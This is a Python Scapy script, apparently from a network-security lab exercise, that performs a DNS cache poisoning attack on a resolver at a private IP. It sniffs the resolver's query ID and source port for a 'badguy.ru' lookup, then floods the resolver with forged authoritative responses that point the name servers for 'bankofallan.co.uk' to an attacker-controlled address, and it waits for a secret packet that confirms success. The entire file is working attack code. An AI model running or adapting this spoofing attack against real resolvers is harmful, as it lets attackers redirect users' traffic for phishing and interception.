from scapy.all import *
from threading import Thread

DNS_SPOOF_IP = "10.0.0.1"
VULN_DNS_IP = "192.168.56.101"
BAD_DNS_IP = "192.168.56.1"
FAKE_REQUEST = "spoofing.bankofallan.co.uk"
FAKE_DOMAIN = "bankofallan.co.uk"
CONFIG_DNS_PORT = 55553

Q_ID = 0                # query ID
PORT_NUMBER = 0         # port to catch
GOAL = 0                # Victory
N_TRY = 1
PACKETS = []

class FirstThread(Thread):
        def __init__(self, name, job):
                Thread.__init__(self)
                self.name = name
                self.job = job

        def run(self):
                if self.job == 0:                                                                                       # sniffing port and ID
                        sniffer_job()

                if self.job == 1:                                                                                       # listening the secret
                        secret_job()

def sniffer_job():
        '''
        sniff the recursive query for badguy.ru
        catch query ID and port number
        :return:
        '''
        global Q_ID
        global PORT_NUMBER
        global GOAL

        raw = sniff(count=1, timeout=1, filter="src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port " + str(CONFIG_DNS_PORT))
        if GOAL == 0:
                raw_pkt = str(raw[0].getlayer(Raw))
                dns = DNS(raw_pkt)
                Q_ID = dns.id
                PORT_NUMBER = raw[0].getlayer(UDP).sport

def secret_job():
        '''
        wait for secret and update GOAL
        :return:
        '''
        global GOAL

        scrt_pkt = sniff(count=1, filter= "src host " + VULN_DNS_IP + " and dst host " + BAD_DNS_IP + " and dst port 1337")
        GOAL = 1
        scrt_pkt[0].show()

def master_job():
        '''
        MAIN
        :return:
        '''
        global GOAL
        global Q_ID
        global PORT_NUMBER
        global N_TRY
        global PACKETS

        listener_thread = FirstThread(name="listener", job=1)                                                           # init listener
        listener_thread.start()

        while GOAL == 0:
                sniffer_thread = FirstThread(name="sniffer", job=0)                                                     # init sniffer
                sniffer_thread.start()

                time.sleep(1)                                                                                           # waiting for the sniffer
                send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))                              # badguy query

                if Q_ID == 0 or PORT_NUMBER == 0:
                        sniffer_thread.join()
                        continue

                print ('\n\n\nTry # ' + str(N_TRY) + '\n[FOUND]\tqID: ' + str(hex(Q_ID)) + '\t port: ' + str(PORT_NUMBER))


                # TODO N.B: sul mio pc il DNS impiega 1 ms per un dig, in 1 ms l'host riesce a mandare circa 150 pacchetti, cambiarlo se necessario
                for index in range(1, 200):                                                                             # building fake packets
                        pkt = IP(dst=VULN_DNS_IP, src=DNS_SPOOF_IP) / UDP(sport=53, dport=PORT_NUMBER) / \
                              DNS(id=((Q_ID + index) % 65535), qr=1L, opcode='QUERY', aa=1L, tc=0L, rd=1L, ra=1L, z=0L, rcode='ok',
                                  qdcount=1, ancount=0,
                                  nscount=1, arcount=1,
                                  qd=(DNSQR(qname=FAKE_REQUEST, qtype='A', qclass='IN')),
                                  an=None,
                                  ns=(DNSRR(rrname=FAKE_DOMAIN, type='NS', rclass='IN', ttl=60000,
                                            rdata=FAKE_REQUEST)),
                                  ar=(DNSRR(rrname=FAKE_REQUEST, type='A', rclass='IN', ttl=60000,
                                            rdata=BAD_DNS_IP)))
                        PACKETS.append(bytes(pkt))

                # fake request
                raw_sock.sendto((bytes(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname=FAKE_REQUEST)))), (VULN_DNS_IP, PORT_NUMBER))

                for pkt in PACKETS:
                        raw_sock.sendto(pkt, (VULN_DNS_IP, PORT_NUMBER))                                                # sending fake packets

                PORT_NUMBER = 0                                                                                         # reset for next cycle
                Q_ID = 0
                N_TRY = N_TRY + 1
                PACKETS = []

        listener_thread.join()
        print "Goal reached.\nEND"

############################ MAIN ###########################
# init socket
raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)

master_job()

raw_sock.close()